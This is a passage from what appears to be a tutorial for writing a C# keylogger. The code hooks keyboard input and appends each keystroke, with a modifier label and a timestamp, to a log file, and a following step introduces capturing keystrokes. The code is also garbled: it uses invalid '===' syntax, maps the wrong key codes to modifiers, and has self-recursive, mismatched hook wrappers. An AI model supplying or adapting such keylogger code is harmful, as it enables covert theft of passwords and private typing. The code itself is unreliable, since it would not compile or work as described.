        sb.Append((char)wParam);
        if (state === KeyStates.Down && (wParam == 0x1 || wParam == 0x2 || wParam == 0x4))
        {
            sb.Append(" + Shift");
        }
        else if (state === KeyStates.Down && (wParam == 0x20 || wParam == 0xC0))
        {
            sb.Append(" + Ctrl");
        }
        else if (state === KeyStates.Down && (wParam == 0xA0 || wParam == 0xA1))
        {
            sb.Append(" + Alt");
        }

        sb.Append(" at " + DateTime.Now.ToString("HH:mm:ss.fff"));
        File.AppendAllText(logFile, sb.ToString() + "\n");
        return 1;
    }

    private static int SetWindowsHook(int type, HookCallback callback)
    {
        return SetWindowsHookEx(type, callback, IntPtr.Zero, 0);
    }

    private static int SetWindowsHookEx(int type, HookCallback callback, IntPtr hwnd, int id)
    {
        return SetWindowsHookEx(type, callback, hwnd, id, 0);
    }

    // To prevent the hook from interfering with other applications
    public static void DisableOtherHooks()
    {
        UnhookWindowsHook(WH_MOUSE, HookCallback);
    }
}
```

### Step 2: Use the Logger
In your main program, initialize the logger and start the loop to capture keystrokes.

